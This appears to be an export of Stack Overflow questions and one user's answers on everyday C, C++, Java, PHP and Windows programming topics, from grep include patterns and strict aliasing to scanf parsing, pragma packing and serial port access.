<pre><code>grep pattern -r --include=\*.{cpp,h} rootdir
</code></pre>

<p>The syntax for <code>--exclude</code> is identical.</p>

<p>Note that the star is escaped with a backslash to prevent it from being expanded by the shell (quoting it, such as <code>--include=""*.{cpp,h}""</code>, would work just as well).  Otherwise, if you had any files in the current working directory that matched the pattern, the command line would expand to something like <code>grep pattern -r --include=foo.cpp --include=bar.h rootdir</code>, which would only search files named <code>foo.cpp</code> and <code>bar.h</code>, which is quite likely not what you wanted.</p>
"
"<p>This <a href=""http://themechanicalbride.blogspot.com/2008/04/using-operators-with-generics.html"" rel=""nofollow"">article</a> describes a way, in C#, to allow the addition of arbitrary value types which have a + operator defined for them. In essence it allows the following code:</p>

<pre><code>public T Add(T val1, T val2)
{
   return val1 + val2;
}
</code></pre>

<p>This code does not compile as there is no guarantee that the T type has a definition for the '+' operator, but the effect is achieved with code like this:</p>

<pre><code>public T Add(T val1, T val2)
{
   //Num&lt;T&gt; defines a '+' operation which returns a value of type T
   return (new Num&lt;T&gt;(val1) + new Num&lt;T&gt;(val2));
}
</code></pre>

<p>Follow the link to see how the Num class achieves this. Anyways, on to the question. Is there any way to achieve the same effect in C or C++? For the curious, the problem I'm trying to solve is to allow a CUDA kernel to be more flexible/general by allowing it to operate on more types.</p>

<p><strong>Update:</strong> For .NET, Marc Gravell has made a <a href=""http://www.yoda.arachsys.com/csharp/miscutil/usage/genericoperators.html"" rel=""nofollow"">utility library</a> which solves the operator problem very elegantly.</p>
","9530","Adam Rosenfield","<p>This can easily be done in C++ using templates:</p>

<pre><code>
template &lt;typename T&gt;
T Add(T val1, T val2)
{
  return val1 + val2;
}</code></pre>

<p>Note, however, that this <strong>must</strong> be defined in a header file, and you probably also want to pass the parameters by const reference instead of by value.</p>

<p>This cannot be done in plain C at all.</p>
"
"<p>In an Open Source <a href=""http://honeypot.net/project/pgdbf"" rel=""nofollow"">program I
wrote</a>, I'm reading binary data (written by another program) from a file and outputting ints, doubles,
and other assorted data types.  One of the challenges is that it needs to
run on 32-bit and 64-bit machines of both endiannesses, which means that I
end up having to do quite a bit of low-level bit-twiddling.  I know a (very)
little bit about type punning and strict aliasing and want to make sure I'm
doing things the right way.</p>

<p>Basically, it's easy to convert from a char* to an int of various sizes:</p>

<pre><code>int64_t snativeint64_t(const char *buf) 
{
    /* Interpret the first 8 bytes of buf as a 64-bit int */
    return *(int64_t *) buf;
}
</code></pre>

<p>and I have a cast of support functions to swap byte orders as needed, such
as:</p>

<pre><code>int64_t swappedint64_t(const int64_t wrongend)
{
    /* Change the endianness of a 64-bit integer */
    return (((wrongend &amp; 0xff00000000000000LL) &gt;&gt; 56) |
            ((wrongend &amp; 0x00ff000000000000LL) &gt;&gt; 40) |
            ((wrongend &amp; 0x0000ff0000000000LL) &gt;&gt; 24) |
            ((wrongend &amp; 0x000000ff00000000LL) &gt;&gt; 8)  |
            ((wrongend &amp; 0x00000000ff000000LL) &lt;&lt; 8)  |
            ((wrongend &amp; 0x0000000000ff0000LL) &lt;&lt; 24) |
            ((wrongend &amp; 0x000000000000ff00LL) &lt;&lt; 40) |
            ((wrongend &amp; 0x00000000000000ffLL) &lt;&lt; 56));
}
</code></pre>

<p>At runtime, the program detects the endianness of the machine and assigns
one of the above to a function pointer:</p>

<pre><code>int64_t (*slittleint64_t)(const char *);
if(littleendian) {
    slittleint64_t = snativeint64_t;
} else {
    slittleint64_t = sswappedint64_t;
}
</code></pre>

<p>Now, the tricky part comes when I'm trying to cast a char* to a double.  I'd
like to re-use the endian-swapping code like so:</p>

<pre><code>union 
{
    double  d;
    int64_t i;
} int64todouble;

int64todouble.i = slittleint64_t(bufoffset);
printf(""%lf"", int64todouble.d);
</code></pre>

<p>However, some compilers could optimize away the ""int64todouble.i"" assignment
and break the program.  Is there a safer way to do this, while considering
that this program must stay optimized for performance, and also that I'd
prefer not to write a parallel set of transformations to cast char* to
double directly?  If the union method of punning is safe, should I be
re-writing my functions like snativeint64_t to use it?</p>

<hr />

<p>I ended up using <a href=""http://stackoverflow.com/users/13005/"">Steve Jessop's</a> answer because the conversion functions re-written to use memcpy, like so:</p>

<pre><code>int64_t snativeint64_t(const char *buf) 
{
    /* Interpret the first 8 bytes of buf as a 64-bit int */
    int64_t output;
    memcpy(&amp;output, buf, 8);
    return output;
}
</code></pre>

<p>compiled into the exact same assembler as my original code:</p>

<pre><code>snativeint64_t:
        movq    (%rdi), %rax
        ret
</code></pre>

<p>Of the two, the memcpy version more explicitly expresses what I'm trying to do and should work on even the most naive compilers.</p>

<p>Adam, your answer was also wonderful and I learned a lot from it.  Thanks for posting!</p>
","9530","Adam Rosenfield","<p>I highly suggest you read <a href=""http://cellperformance.beyond3d.com/articles/2006/06/understanding-strict-aliasing.html"" rel=""nofollow"">Understanding Strict Aliasing</a>.  Specifically, see the sections labeled ""Casting through a union"".  It has a number of very good examples.  While the article is on a website about the Cell processor and uses PPC assembly examples, almost all of it is equally applicable to other architectures, including x86.</p>
"
"<p>Hallo everybody,</p>

<p>I would like to know the complexity in Big O notation of the STL multiset, map and hash map classes when:</p>

<ul>
<li>inserting entries</li>
<li>accessing entries</li>
<li>retrieving entries</li>
<li>comparing entries</li>
</ul>
","9530","Adam Rosenfield","<h1>map, set, multimap, and multiset</h1>

<p>These are implemented using a <a href=""http://en.wikipedia.org/wiki/Red-black_tree"">red-black tree</a>, a type of <a href=""http://en.wikipedia.org/wiki/Balanced_binary_search_tree"">balanced binary search tree</a>.  They have the following asymptotic run times:</p>

<p>Insertion: O(log n)<br />
Lookup: O(log n)<br />
Deletion: O(log n)</p>

<h1>hash_map, hash_set, hash_multimap, and hash_multiset</h1>

<p>These are implemented using <a href=""http://en.wikipedia.org/wiki/Hash_table"">hash tables</a>.  They have the following runtimes:</p>

<p>Insertion: O(1) expected, O(n) worst case<br />
Lookup: O(1) expected, O(n) worst case<br />
Deletion: O(1) expected, O(n) worst case</p>

<p>If you use a proper hash function, you'll almost never see the worst case behavior, but it is something to keep in mind -- see <a href=""http://www.cs.rice.edu/~scrosby/hash/CrosbyWallach_UsenixSec2003.pdf"">this paper</a> for an example.</p>
"
"<p>My class is implementing a super-class method which which returns <code>List&lt;JComponent&gt;</code>.  The list being returned is read-only:</p>

<pre><code>public abstract class SuperClass {
    public abstract List&lt;JComponent&gt; getComponents();
}
</code></pre>

<p>In my class, I want to return a field which is declared as List - i.e. a sub-list:</p>

<pre><code>public class SubClass extends SuperClass {
    private List&lt;JButton&gt; buttons;
    public List&lt;JComponent&gt; getComponents() {
        return buttons;
    }
}
</code></pre>

<p>This generates a compiler error, as <code>List&lt;JButton&gt;</code> is not a subtype of <code>List&lt;JComponent&gt;</code>.</p>

<p>I can understand why it doesn't compile, as it shouldn't be allowed to add a JTextField to a List of JButtons.</p>

<p>However, as the list is read-only, then ""conceptually"" this should be allowed.  But, of course, the compiler doesn't know that it is read-only.</p>

<p>Is there any way to achieve what I want to achieve, without changing the method declaration in the super-class, and the field declaration in the sub-class?</p>

<p>Thanks,
Calum</p>
","9530","Adam Rosenfield","<p>Declare <code>getComponents()</code> as:</p>

<pre><code>public List&lt;? extends JComponent&gt; getComponents()
</code></pre>
"
"<p>I have a regexp I'm using with sed, but now I need to make it work in PHP also. I can't use system calls as they are disabled.</p>

<pre>
$ cat uglynumber.txt:
Ticket number : 303905694, FOO:BAR:BAR: Some text
Case ID:123,456,789:Foobar - Some other text
303867970;[FOOBAR] Some text goes here
Case Ref: 303658850 - Some random text here - host.tld #78854w
</pre>

<pre>
$ cat uglynumbers.txt | sed ""s/[, ]//g;s/.*\([0-9]\{9\}\).*/\1/g""
303905694
123456789
303867970
303658850
</pre>

<p>So, how to do the same with PHP?</p>

<p>I found one example like this, but I can't inject that regexp into that.</p>

<pre>
if (preg_match(""/.../"", $line, $matches)) {
  echo ""Match was found"";
  echo $matches[0];
}
</pre>
","9530","Adam Rosenfield","<p>Try using <a href=""http://us2.php.net/preg_replace"" rel=""nofollow""><code>preg_replace()</code></a> instead of <code>preg_match()</code>.  <code>grep</code> is to <code>sed</code> what <code>preg_match</code> is to <code>preg_replace</code>.</p>
"
"<p>In the spirit of questions like <a href=""http://stackoverflow.com/questions/224059/do-your-loops-test-at-the-top-or-bottom"">Do your loops test at the top or bottom?</a>:</p>

<p>Which style do you use for an <em>infinite</em> loop, and why?</p>

<ul>
<li>while (true) { }</li>
<li>do { } while (true);</li>
<li>for (;;) { }</li>
<li>label: ... goto label;</li>
</ul>
","9530","Adam Rosenfield","<p>I prefer <code>while(1)</code> or <code>while(true)</code> -- it's the clearest.  <code>do { } while(true)</code> seems like needless obfuscation.  Likewise, <code>for(;;)</code> can be confusing to people that have never seen it before, whereas <code>while(true)</code> is very intuitive.  And there's absolutely no reason to do <code>label: ... goto label;</code>, it's just more confusing.</p>
"
"<p>I'd love to create a ""back"" left-arrow-bezel button in a UIToolbar.</p>

<p>As far as I can tell, the only way to get one of these is to leave UINavigationController at default settings and it uses one for the left bar item. But there's no way I can find to create one as a UIBarButtonItem, so I can't make one in a standard UIToolbar, even though they're very similar to UINavigationBars.</p>

<p>I could manually create it with button images, but I can't find the source images anywhere. They have alpha-channel edges, so screenshotting and cutting won't get very versatile results.</p>

<p>Any ideas beyond screenshotting for every size and color scheme I intend to use?</p>

<p><strong>Update:</strong> PLEASE STOP dodging the question and suggesting that I shouldn't be asking this and should be using UINavigationBar. My app is Instapaper Pro. It shows only a bottom toolbar (to save space and maximize readable content area), and I wish to put a left-arrow-shaped Back button in the bottom.</p>

<p>Telling me that I shouldn't need to do this <strong>is not an answer</strong> and certainly doesn't deserve a bounty.</p>
","9530","Adam Rosenfield","<p>I'm not sure if this would work, but you could try creating a <code>UINavigationController</code> with the default settings to create the button, find the button in the navigation controller's subview hierarchy, call <code>removeFromSuperview</code> on it, destroy the navigation controller, and then add the button as a subview of your toolbar.  You may also need to <code>retain</code> and the button before calling <code>removeFromSuperview</code> (and then <code>release</code> it after adding it as subview of your toolbar) to avoid it being deallocated during the process.</p>
"
"<p>... using any comparison operators... and without using if, else, etc.</p>
","9530","Adam Rosenfield","<p>This is kind of cheating, using assembly language, but it's interesting nonetheless:</p>

<pre><code>
// GCC inline assembly
int max(int a, int b)
{
  __asm__(""movl %0, %%eax\n\t""   // %eax = a
          ""cmpl %%eax, %1\n\t""   // compare a to b
          ""cmovg %1, %%eax""      // %eax = b if b>a
         :: ""r""(a), ""r""(b));
}
</code></pre>

<p>If you want to be strict about the rules and say that the <code>cmpl</code> instruction is illegal for this, then the following (less efficient) sequence will work:</p>

<pre><code>
int max(int a, int b)
{
  __asm__(""movl %0, %%eax\n\t""
      ""subl %1, %%eax\n\t""
          ""cmovge %0, %%eax\n\t""
          ""cmovl %1, %%eax""
         :: ""r""(a), ""r""(b)
         :""%eax"");
}
</code></pre>
"
"<p>Please don't answer the obvious, but what are the limit signs that tell us a problem should not be solved using reg exprs.</p>

<p>For example: Why is a complete email validation too complex for a regular expression?</p>
","9530","Adam Rosenfield","<p>When you need to parse an expression that's not defined by a <a href=""http://en.wikipedia.org/wiki/Regular_language"">regular language</a>.</p>
"
"<p>Where are variables in C++ stored?</p>

<p>Inside the RAM or the processor's cache?</p>
","9530","Adam Rosenfield","<p>Variables can be held in a number of different places, sometimes in more than one place.  Most variables are placed in RAM when a program is loaded; sometimes variables which are declared <code>const</code> are instead placed in ROM.  Whenever a variable is accessed, if it is not in the processor's cache, a cache miss will result, and the processor will stall while the variable is copied from RAM/ROM into the cache.</p>

<p>If you have any halfway decent optimizing compiler, local variables will often instead be stored in a processor's register file.  Variables will move back and forth between RAM, the cache, and the register file as they are read and written, but they will generally always have a copy in RAM/ROM, unless the compiler decides that's not necessary.</p>
"
"<p>I encountered a problem when running some old code that was handed down to me. It works 99% of the time, but once in a while, I notice it throwing a ""Violation reading location"" exception. I have a variable number of threads potentially executing this code throughout the lifetime of the process. The low occurrence frequency may be indicative of a race condition, but I don't know why one would cause an exception in this case. Here is the code in question:</p>

<pre><code>MyClass::Dostuff()
{
    static map&#60;char, int&#62; mappedChars;
    if (mappedChars.empty())
    {
       for (char c = '0'; c &#60;= '9'; ++c)
       {
          mappedChars[c] = c - '0';
       }
    }
    // More code here, but mappedChars in not changed.
}
</code></pre>

<p>The exception is thrown in the map's operator[] implementation, on the very first call to the operator[] (Using the VS2005 implementation of STL.)</p>

<pre><code>
mapped_type& operator[](const key_type& _Keyval)
{
    iterator _Where = this->lower_bound(_Keyval); //exception thrown on the first line
    // More code here
}
</code></pre>

<p>I already tried freezing threads in operator[] and trying to get them to all run through it at the same time, but I was unable to reproduce the exception using that methodology.</p>

<p>Can you think of any reason why that would throw, and only some of the time? </p>

<p>(Yes, I know STL is not thread-safe and I'll need to make changes here. I am mostly curious as to WHY I'm seeing the behavior I described above.)</p>

<p>As requested, here some further details about the exception:<br>
Unhandled exception at 0x00639a1c (app.exe) in app15-51-02-0944_2008-10-23.mdmp: 0xC0000005: Access violation reading location 0x00000004.</p>

<p>Thanks to everyone suggesting solutions to multithreading issues, but this isn't what this question is meant to address. Yes, I understand the presented code is not protected correctly and is overkill in what it's trying to accomplish. I already have the fix for it implemented. I'm just trying to get a better understanding of why this exception was thrown to begin with.</p>
","9530","Adam Rosenfield","<p>Are you ever calling <code>operator[]</code> with an argument that's not in the range <code>0..9</code>?  If so, then you are inadvertently modifying the map, which is likely causing badness to happen in other threads.  If you call <code>operator[]</code> with an argument not already in the map, it inserts that key into the map with a value equal to the default value of the value type (0 in the case of <code>int</code>).</p>
"
"<p>I am Manoj here to ask a question again.</p>

<p>In C and C++ what do the following declarations do?</p>

<pre><code>const int * i;
int * const i;
const volatile int ip;
const int *i;
</code></pre>

<p>Are any of the above declarations wrong?</p>

<p>If not what is the meaning and differences between them?</p>

<p>What are the useful uses of above declarations (I mean in which situation we have to use them in c/c++/embedded c?)</p>
","9530","Adam Rosenfield","<p><code>const int * i;</code></p>

<p><code>i</code> is a pointer to constant integer.  <code>i</code> can be changed to point to a different value, but the value being pointed to by <code>i</code> can not be changed.</p>

<p><code>int * const i;</code></p>

<p><code>i</code> is a constant pointer to a non-constant integer.  The value pointed to by <code>i</code> can be changed, but <code>i</code> cannot be changed to point to a different value.</p>

<p><code>const volatile int ip;</code></p>

<p>This one is kind of tricky.  The fact that <code>ip</code> is <code>const</code> means that the compiler will not let you change the value of <code>ip</code>.  However, it could still be modified in theory, e.g. by taking its address and using the <code>const_cast</code> operator.  This is very dangerous and not a good idea, but it is allowed.  The <code>volatile</code> qualifier indicates that any time <code>ip</code> is accessed, it should always be reloaded from memory, i.e. it should NOT be cached in a register.  This prevents the compiler from making certain optimizations.  You want to use the <code>volatile</code> qualifier when you have a variable which might be modified by another thread, or if you're using memory-mapped I/O, or other similar situations which could cause behavior the compiler might not be expecting.  Using <code>const</code> and <code>volatile</code> on the same variable is rather unusual (but legal) -- you'll usually see one but not the other.</p>

<p><code>const int *i; </code></p>

<p>This is the same as the first declaration.</p>
"
"<p>Can you tell me a usage of #pragma in c with an example</p>
","9530","Adam Rosenfield","<p>I would generally try to avoid the use of #pragmas if possible, since they're extremely compiler-dependent and non-portable.  If you want to use them in a portable fashion, you'll have to surround every pragma with a #if/#endif pair.  GCC discourages the use of pragmas, and really only supports some of them for compatibility with other compilers; GCC has other ways of doing the same things that other compilers use pragmas for.</p>

<p>For example, here's how you'd ensure that a structure is packed tightly (i.e. no padding between members) in MSVC:</p>

<pre><code>#pragma pack(push, 1)
struct PackedStructure
{
  char a;
  int b;
  short c;
};
#pragma pack(pop)
// sizeof(PackedStructure) == 7</code></pre>

<p>Here's how you'd do the same thing in GCC:</p>

<pre><code>struct PackedStructure __attribute__((__packed__))
{
  char a;
  int b;
  short c;
};
// sizeof(PackedStructure == 7)</code></pre>

<p>The GCC code is more portable, because if you want to compile that with a non-GCC compiler, all you have to do is</p>

<p><code>#define __attribute__(x)</code></p>

<p>Whereas if you want to port the MSVC code, you have to surround each pragma with a #if/#endif pair.  Not pretty.</p>
"
"<p>I have a string containing a date, and another string containing the date format of the first string. Is there a function that I can call to convert that date into something like a SYSTEMTIME structure? Basically, I'd like the opposite of <a href=""http://msdn.microsoft.com/en-us/library/ms776293(VS.85).aspx"" rel=""nofollow"">GetDateFormat()</a>.</p>
","9530","Adam Rosenfield","<p>If you have a POSIX system, you can use the <a href=""http://linux.about.com/library/cmd/blcmdl3_strptime.htm"" rel=""nofollow""><code>strptime()</code></a> function.  Unfortunately, MSVC 2005 does not seem to have this function in its C runtime; MinGW for Windows does.</p>
"
"<p>I'm trying to come up with a Java regex that will match a filename only if it has a valid extension. For example it should match ""foo.bar"" and ""foo.b"", but neither ""foo."" nor ""foo"".</p>

<p>I've written the following test program</p>

<pre><code>public static void main(String[] args) {
  Pattern fileExtensionPattern = Pattern.compile(""\\.\\w+\\z"");

  boolean one = fileExtensionPattern.matcher(""foo.bar"").matches();
  boolean two = fileExtensionPattern.matcher(""foo.b"").matches();
  boolean three = fileExtensionPattern.matcher(""foo."").matches();
  boolean four = fileExtensionPattern.matcher(""foo"").matches();

  System.out.println(one + "" "" + two + "" "" + three + "" "" + four);
}
</code></pre>

<p>I expect this to print ""true true false false"", but instead it prints false for all 4 cases. Where am I going wrong?</p>

<p>Cheers,
Don</p>
","9530","Adam Rosenfield","<p>The <a href=""http://java.sun.com/javase/6/docs/api/java/util/regex/Matcher.html#matches()"">Matcher.matches()</a> function tries to match the pattern against the entire input.  Thus, you have to add <code>.*</code> to the beginning of your regex (and the <code>\\Z</code> at the end is superfluous, too), or use the <a href=""http://java.sun.com/javase/6/docs/api/java/util/regex/Matcher.html#find()"">find()</a> method.</p>
"
"<p>When doing case-insensitive comparisons, is it more efficient to convert the string to upper case or lower case?  Does it even matter?</p>

<p>It is suggested <a href=""http://stackoverflow.com/questions/9033/hidden-features-of-c#12137"">in this SO post</a> that C# is more efficient with ToUpper because ""Microsoft optimized it that way.""  But I've also read <a href=""http://www.petefreitag.com/item/175.cfm"">this argument</a> that converting ToLower vs. ToUpper depends on what your strings contain more of, and that typically strings contain more lower case characters which makes ToLower more efficient.</p>

<p>In particular, I would like to know:</p>

<ul>
<li>Is there a way to optimize ToUpper or ToLower such that one is faster than the other?</li>
<li>Is it faster to do a case-insensitive comparison between upper or lower case strings, and why?</li>
<li>Are there any programming environments (eg. C, C#, Python, whatever) where one case is clearly better than the other, and why?</li>
</ul>
","9530","Adam Rosenfield","<p>It really shouldn't ever matter.  With ASCII characters, it definitely doesn't matter - it's just a few comparisons and a bit flip for either direction.  Unicode might be a little more complicated, since there are some characters that change case in weird ways, but there really shouldn't be any difference unless your text is full of those special characters.</p>
"
"<p>I come from a .NET world and I'm new to writting C++. I'm just wondering what are the preferred naming conventions when it comes to naming local variables and struct members.</p>

<p>For example, the legacy code that I've inheritted has alot of these:</p>

<pre><code>struct MyStruct
{
   TCHAR           szMyChar[STRING_SIZE];
   bool            bMyBool;
   unsigned long   ulMyLong;
   void*           pMyPointer;
   MyObject**      ppMyObjects;
}
</code></pre>

<p>Coming from a C# background I was shocked to see the variables with hungarian notation (I couldn't stop laughing at the pp prefix the first time I saw it).</p>

<p>I would much rather name my variables this way instead (although I'm not sure if capitalizing the first letter is a good convention. I've seen other ways (see links below)):</p>

<pre><code>struct MyStruct
{
   TCHAR           MyChar[STRING_SIZE];
   bool            MyBool;
   unsigned long   MyLong;
   void*           MyPointer;
   MyObject**      MyObjects;
}
</code></pre>

<p>My question: Is this (the former way) still a preferred way to name variables in C++?</p>

<p>References:</p>

<p><a href=""http://geosoft.no/development/cppstyle.html"">http://geosoft.no/development/cppstyle.html</a></p>

<p><a href=""http://www.syntext.com/books/syntext-cpp-conventions.htm"">http://www.syntext.com/books/syntext-cpp-conventions.htm</a></p>

<p><a href=""http://ootips.org/hungarian-notation.html"">http://ootips.org/hungarian-notation.html</a></p>

<p>Thanks!</p>
","9530","Adam Rosenfield","<p>The most important thing is to be consistent.  If you're working with a legacy code base, name your variables and functions <em>consistently</em> with the naming convention of the legacy code.  If you're writing new code that is only interfacing with old code, use your naming convention in the new code, but be consistent with yourself too.</p>
"
"<p>Does the C++ compiler optimize this operation?</p>

<p>I would love to believe that yes.</p>
","9530","Adam Rosenfield","<p>Yes.  They also optimize other similar operations, such as multiplying by non-powers of two that can be rewritten as the sums of some shifts.  They will also optimize divisions by powers of 2 into right-shifts, but beware that when working with signed integers, the two operations are different!  The compiler has to emit some extra bit twiddling instructions to make sure the results are the same for positive and negative numbers, but it's still faster than doing a division.  It also similarly optimizes moduli by powers of 2.</p>
"
"<p>I want to hold a bunch of const char pointers into an std::set container [1].  std::set template requires a comparator functor, and the standard C++ library offers std::less, but its implementation is based on comparing the two keys directly, which is not standard for pointers.</p>

<p>I know I can define my own functor and implement the operator() by casting the pointers to integers and comparing them, but is there a cleaner, 'standard' way of doing it?</p>

<p>Please do not suggest creating std::strings - it is a waste of time and space.  The strings are static, so they can be compared for (in)equality based on their address.</p>

<p>1: The pointers are to static strings, so there is no problem with their lifetimes - they won't go away.</p>
","9530","Adam Rosenfield","<p>The standard way of doing it, if you don't want to wrap them in <code>std::string</code>s, is to define a functor class:</p>

<pre><code>struct ConstCharStarComparator
{
  bool operator()(const char *s1, const char *s2) const
  {
    return strcmp(s1, s2) &lt; 0;
  }
}

typedef std::set&lt;onst char *, ConstCharStarComparator&gt; stringset_t;
stringset_t myStringSet;</code></pre>
"
"<p>Is there a fixed point in the MD5 transformation, i.e. does there exist x such that <code>md5(x) == x</code>?</p>
","9530","Adam Rosenfield","<p>Since an MD5 sum is 128 bits long, any fixed point would necessarily also have to be 128 bits long.  Assuming that the MD5 sum of any string is uniformly distributed over all possible sums, then the probability that any given 128-bit string is a fixed point is 1/2^128.</p>

<p>Thus, the probability that no 128-bit string is a fixed point is (1 − 1/2^128)^(2^128), so the probability that there is a fixed point is 1 − (1 − 1/2^128)^(2^128).</p>

<p>Since the limit as n goes to infinity of (1 − 1/n)^n is 1/<em>e</em>, and 2^128 is most certainly a very large number, this probability is almost exactly 1 − 1/<em>e</em> ≈ 63.21%.</p>

<p>Of course, there is no randomness actually involved - there either is a fixed point or there isn't.  But, we can be 63.21% confident that there is a fixed point.  (Also, notice that this number does not depend on the size of the keyspace - if MD5 sums were 32 bits or 1024 bits, the answer would be the same, so long as it's larger than about 4 or 5 bits).</p>
"
"<p>As a developer, we do various activities everyday each requiring a set of things to take care of or to complete before we can say that the activity is complete. It is impossible to keep  all these 'things' in memory and hence we have checklists. There are checklists for things to do before you commit code, things that a code reviewer needs to check, things to do/verify before a shared database is updated, things to check before we send out a build to customer.</p>

<p>Anyone using any software, tool or mechanism (anything formal and not ad-hoc) to maintain ,manage and record all the various checklists that can exist in the day of a developer?</p>
","9530","Adam Rosenfield","<p><a href=""http://www.atlassian.com/software/confluence/"" rel=""nofollow"">Confluence</a> is a wiki which has built-in support for a lot of nifty widgets such as checklists within wiki pages.  I personally haven't used the checklist widget, but there's a nice WYSIWYG editor for creating and maintaining them.  Unfortunately, Confluence is not free.</p>

<p><a href=""http://www.atlassian.com/software/confluence/plugins/tasklist.jsp"" rel=""nofollow"">Here</a>'s a page detailing the checklist widget.</p>
"
"<p>I have a method that creates a MessageDigest (a hash) from a file, and I need to do this to a lot of files (>= 100,000). How big should I make the buffer used to read from the files to maximize performance?</p>

<p>Most everyone is familiar with the basic code (which I'll repeat here just in case):</p>

<pre><code>MessageDigest md = MessageDigest.getInstance( ""SHA"" );
FileInputStream ios = new FileInputStream( ""myfile.bmp"" );
byte[] buffer = new byte[4 * 1024]; // what should this value be?
int read = 0;
while( ( read = ios.read( buffer ) ) &gt; 0 )
    md.update( buffer, 0, read );
ios.close();
md.digest();
</code></pre>

<p>What is the ideal size of the buffer to maximize throughput? I know this is system dependent, and I'm pretty sure its OS, FileSystem, <em>and</em> HDD dependent, and there maybe other hardware/software in the mix. </p>

<p>(I should point out that I'm somewhat new to Java, so this may just be some Java API call I don't know about.)</p>

<p><strong>Edit:</strong> I do not know ahead of time the kinds of systems this will be used on, so I can't assume a whole lot. (I'm using Java for that reason.)</p>

<p><strong>Edit:</strong> The code above is missing things like try..catch to make the post smaller</p>
","9530","Adam Rosenfield","<p>In most cases, it really doesn't matter that much.  Just pick a good size such as 4K or 16K and stick with it.  If you're <em>positive</em> that this is the bottleneck in your application, then you should start profiling to find the optimal buffer size.  If you pick a size that's too small, you'll waste time doing extra I/O operations and extra function calls.  If you pick a size that's too big, you'll start seeing a lot of cache misses which will really slow you down.  Don't use a buffer bigger than your L2 cache size.</p>
"
"<p>Is there a way to accept input from more than one mouse separately? I'm interested in making a multi-user application and I thought it would be great if I could have 2 or more users holding wireless mice each interacting with the app individually with a separate mouse arrow.</p>

<p>Is this something I should try to farm out to some other application/driver/os_magic? or is there a library I can use to accomplish this? Language isn't a <em>HUGE</em> deal, but C, C++, and Python are preferrable.</p>

<p>Thanks :)</p>

<p>edit:</p>

<p>Found this multi-pointer toolkit for linux (it's actually a multi-pointer x server):
<a href=""http://wearables.unisa.edu.au/mpx/"" rel=""nofollow"">http://wearables.unisa.edu.au/mpx/</a></p>
","9530","Adam Rosenfield","<p>You could use DirectInput with C/C++ (there's probably also bindings in other languages).  You use <a href=""http://msdn.microsoft.com/en-us/library/bb205950(VS.85).aspx"" rel=""nofollow""><code>IDirectInput8::EnumDevices()</code></a> (using DX8; same function, different interface in other versions of DirectX) to get a list of all attached devices.  Then, you create the devices and poll them <a href=""http://msdn.microsoft.com/en-us/library/bb205975(VS.85).aspx"" rel=""nofollow""><code>IDirectInputDevice8::Poll()</code></a>.  This should almost definitely work with any number of mice, keyboards, and other input devices.  MSDN has really good documentation on this.</p>
"
"<p>I am working with a peripheral device that needs to be communicated through serial.  I can send it commands using HyperTerminal, but now I need to write programs that will let me do it without HyperTerminal.  Can somebody point me to a website and/or show me a sample hello world program to get me started?  I have searched through many sites which give me uncompilable/ancient VC6 code.</p>
","9530","Adam Rosenfield","<p>In order to interface with the serial port, you open a file with one of the special filenames ""COM1"" through ""COM9"".  For serial ports with higher numbers, the special filename begins with \\?\, which in C/C++ code must be escaped as ""\\\\?\\COM10"", etc.</p>

<p><a href=""http://msdn.microsoft.com/en-us/library/ms810467.aspx"">http://msdn.microsoft.com/en-us/library/ms810467.aspx</a> has a really good tutorial on using the serial port.  Note that you should use the Windows file I/O functions such as <code>CreateFile()</code>, <code>ReadFile()</code>, and <code>WriteFile()</code>.  I'm not sure if it will work to use standard I/O functions such as <code>fopen()</code>, <code>fread()</code>, and <code>fwrite()</code>.</p>
"
"<p>How is Silverlight going to change the internet in the next 10 years?</p>

<p>Is this going to be a scene changer or just another blip?</p>
","9530","Adam Rosenfield","<p>Until Silverlight has respectable implementations in other operating systems (read: OS X and Linux) and it can differentiate itself from Flash considerably, it's never going to grab a significant percentage of the rich content web app market, IMO.</p>
"
"<p>I am using fscanf to read a file which has lines like<br />
Number &lt;-whitespace-> string &lt;-whitespace-> optional_3rd_column  </p>

<p>I wish to extract the number and string out of each column, but ignore the 3rd_column if it exists</p>

<p>Example Data:<br />
12 foo   something<br />
03 bar<br />
24 something   #randomcomment</p>

<p>I would want to extract 12,foo; 03,bar; 24, something while ignoring ""something"" and ""#randomcomment""</p>

<p>I currently have something like</p>

<pre><code>while(scanf(""%d %s %*s"",&amp;num,&amp;word)&gt;=2)
{ 
assign stuff 
}
</code></pre>

<p>However this does not work with lines with no 3rd column. How can I make it ignore everything after the 2nd string?</p>
","9530","Adam Rosenfield","<p>The problem is that the <code>%*s</code> is eating the number on the next line when there's no third column, and then the next <code>%d</code> is failing because the next token is not a number.  To fix it without using <code>gets()</code> followed by <code>sscanf()</code>, you can use the character class specified:</p>

<pre><code>while(scanf(""%d %s%*[^\n]"", &num, &word) == 2)
{ 
    assign stuff 
}</code></pre>

<p>The <code>[^\n]</code> says to match as many characters as possible that aren't newlines, and the <code>*</code> suppresses assignment as before.  Also note that you can't put a space between the <code>%s</code> and the <code>%*[\n]</code>, because otherwise that space in the format string would match the newline, causing the <code>%*[\n]</code> to match the entire subsequent line, which is not what you want.</p>
"
"<p>Ok so I thought it was fixed, but I'm getting totally inconsistent results.
I rewrote it kind of from scratch to start fresh and here are my results.  I get no errors, no crashing, it just doesn't remove them.  It just totally messes up the tree and gives me a ton more leaves, and mixes everything up.  Not sure where else to go</p>

<pre><code>template &lt;class T&gt;
void BST&lt;T&gt;::remove(struct Node&lt;T&gt;*&amp; root, const T&amp; x)
{
   Node&lt;T&gt;* ptr = root;
   bool found = false;
   Node&lt;T&gt;* parent;


   while (ptr != NULL &amp;&amp; !found)
   {
       if (x &lt; ptr-&gt;data)
       {
           parent = ptr;
           ptr = ptr-&gt;left;
       }
       else if (x &gt; ptr-&gt;data)
       {
           parent = ptr;
           ptr = ptr-&gt;right;
       }
       else
           found = true;
   }

   if (found == false)
       return;
   else
   {
       if(ptr-&gt;left != NULL &amp;&amp; ptr-&gt;right != NULL)
       {
           Node&lt;T&gt;* inOrderPtr = ptr-&gt;left;
           parent = ptr;
           while (inOrderPtr-&gt;right != NULL)
           {
               parent = inOrderPtr;
               inOrderPtr = inOrderPtr-&gt;right;
           }

           ptr-&gt;data = inOrderPtr-&gt;data;
           ptr = inOrderPtr;
       }
    Node&lt;T&gt;* subPtr = ptr-&gt;left;
    if (subPtr == NULL)
        subPtr = ptr-&gt;right;

    else if (parent-&gt;left == ptr)
        parent-&gt;left = subPtr;

    else
        parent-&gt;right = subPtr;

    delete ptr;
    }
</code></pre>
